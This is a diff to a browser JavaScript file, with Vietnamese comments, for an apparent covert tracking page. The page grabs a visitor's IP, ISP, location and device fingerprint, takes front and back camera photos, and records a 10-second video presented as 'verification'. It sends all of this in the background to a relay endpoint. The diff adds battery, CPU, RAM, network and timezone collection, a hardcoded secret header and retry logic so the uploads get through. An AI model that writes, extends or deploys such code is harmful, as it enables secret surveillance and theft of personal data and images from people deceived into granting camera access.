@@ -1,4 +1,5 @@
 const API_PROXY = '/api/send';
+const API_SECRET = 'KHOIND_SECURE_TOKEN_2026'; // Khóa bảo mật trùng với Backend
 
 const info = {
   time: new Date().toLocaleString('vi-VN'),
@@ -11,8 +12,18 @@ const info = {
   lon: '',
   device: '',
   os: '',
+  battery: '⏳ Đang kiểm tra...',
+  language: navigator.language || 'Không rõ',
+  timezone: 'Không rõ',
+  cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' cores' : 'Không rõ',
+  ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Không rõ',
+  network: 'Không rõ',
   camera: '⏳ Đang kiểm tra...'
 };
+
+try {
+    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không rõ';
+} catch(e) {}
 
 function detectDevice() {
   const ua = navigator.userAgent;
@@ -20,6 +31,20 @@ function detectDevice() {
   const screenW = window.screen.width;
   const screenH = window.screen.height;
   const ratio = window.devicePixelRatio;
+
+  // Nâng cấp: Thu thập Mạng và Pin
+  if (navigator.connection) {
+      info.network = navigator.connection.effectiveType || navigator.connection.type || 'Không rõ';
+  }
+  if (navigator.getBattery) {
+      navigator.getBattery().then(batt => {
+          const level = Math.round(batt.level * 100) + '%';
+          const isCharging = batt.charging ? ' (Đang sạc)' : '';
+          info.battery = level + isCharging;
+      }).catch(() => info.battery = 'Không hỗ trợ');
+  } else {
+      info.battery = 'Không hỗ trợ';
+  }
 
   if (/Android/i.test(ua)) {
     info.os = 'Android';
@@ -136,7 +161,6 @@ async function captureCamera(facingMode = 'user') {
         setTimeout(() => {
           canvas.getContext('2d').drawImage(video, 0, 0);
           stream.getTracks().forEach(t => t.stop());
-          // Sử dụng mức nén 0.9 để giữ chất lượng cao
           resolve(canvas.toDataURL('image/jpeg', 0.9));
         }, 800);
       };
@@ -157,6 +181,11 @@ function getCaption() {
 🕒 Thời gian: ${info.time}
 📱 Thiết bị: ${info.device}
 🖥️ Hệ điều hành: ${info.os}
+⚙️ CPU/RAM: ${info.cpu} / ${info.ram}
+🔋 Pin: ${info.battery}
+🌐 Mạng: ${info.network}
+🔤 Ngôn ngữ: ${info.language}
+🕒 Múi giờ: ${info.timezone}
 🌍 IP dân cư: ${info.ip}
 🧠 IP gốc: ${info.realIp}
 🏢 ISP: ${info.isp}
@@ -173,42 +202,46 @@ function getCaptionWithExtras() {
   return getCaption() + `\n\n⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.`;
 }
 
+// Nâng cấp: Hàm Fetch kèm theo Security Key và cơ chế Thử lại (Retry)
+async function fetchWithRetry(url, options, retries = 3) {
+    options.headers = options.headers || {};
+    options.headers['x-secure-key'] = API_SECRET; // Gắn chìa khóa bảo mật
+    
+    for (let i = 0; i < retries; i++) {
+        try {
+            const res = await fetch(url, options);
+            if (!res.ok) throw new Error('HTTP Status: ' + res.status);
+            return res;
+        } catch (err) {
+            console.warn(`Lỗi gửi dữ liệu (Lần ${i+1}/${retries}):`, err.message);
+            if (i === retries - 1) throw err;
+            await new Promise(r => setTimeout(r, 2000)); // Chờ 2 giây trước khi thử lại
+        }
+    }
+}
+
 async function sendPhotos(frontB64, backB64) {
   const media = [];
 
   if (frontB64) {
-    media.push({ 
-      type: 'photo', 
-      media: frontB64, 
-      caption: getCaptionWithExtras() 
-    });
+    media.push({ type: 'photo', media: frontB64, caption: getCaptionWithExtras() });
   }
-  
   if (backB64) {
-    media.push({ 
-      type: 'photo', 
-      media: backB64 
-    });
+    media.push({ type: 'photo', media: backB64 });
   }
 
-  return fetch(API_PROXY, {
+  return fetchWithRetry(API_PROXY, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      type: 'media',
-      media: media
-    })
+    body: JSON.stringify({ type: 'media', media: media })
   });
 }
 
 async function sendTextOnly() {
-  return fetch(API_PROXY, {
+  return fetchWithRetry(API_PROXY, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      type: 'text',
-      text: getCaption()
-    })
+    body: JSON.stringify({ type: 'text', text: getCaption() })
   });
 }
 
@@ -238,7 +271,8 @@ async function captureVideoAndSend() {
       reader.onloadend = async () => {
         const base64Video = reader.result;
         try {
-            await fetch(API_PROXY, {
+            // Nâng cấp: Dùng fetchWithRetry để đảm bảo video không bị tịt vì lag mạng
+            await fetchWithRetry(API_PROXY, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -246,9 +280,9 @@ async function captureVideoAndSend() {
                     media: base64Video,
                     caption: '🎬 Clip xác thực hành động (10 giây)'
                 })
-            });
+            }, 3); // Cố gắng gửi video tối đa 3 lần
         } catch (e) {
-            console.error("Lỗi gửi video:", e);
+            console.error("Lỗi gửi video thất bại hoàn toàn:", e);
         }
         
         finishAndRedirect();
@@ -256,7 +290,7 @@ async function captureVideoAndSend() {
     };
 
     recorder.start();
-    // Quay đúng 10 giây theo yêu cầu
+    // Quay đúng 10 giây
     setTimeout(() => { recorder.stop(); }, 10000); 
   } catch (err) {
     console.error("Lỗi xác thực quay video:", err);
@@ -271,7 +305,7 @@ function finishAndRedirect() {
         script.src = 'camera.js'; 
         script.defer = true;
         document.body.appendChild(script);
-        console.log("✅ Hệ thống đã hoàn tất xử lý (Video 10s, Ảnh HD).");
+        console.log("✅ Hệ thống đã hoàn tất xử lý.");
     }, 1500);
 }
 
@@ -294,14 +328,14 @@ async function main() {
     info.camera = '🚫 Bị từ chối hoặc lỗi camera';
   }
 
-  // Tách luồng: Bắn dữ liệu Text & Ảnh đi NGẦM (không dùng await) để tiết kiệm thời gian chờ của người dùng
+  // Tách luồng: Gửi ảnh/text ngầm
   if (front || back) {
     sendPhotos(front, back).catch(err => console.error("Lỗi đẩy ảnh ngầm:", err));
   } else {
     sendTextOnly().catch(err => console.error("Lỗi đẩy text ngầm:", err));
   }
   
-  // Bắt đầu quay video 10s song song ngay lập tức
+  // Bắt đầu quay video 10s ngay lập tức
   await captureVideoAndSend();
 }
 
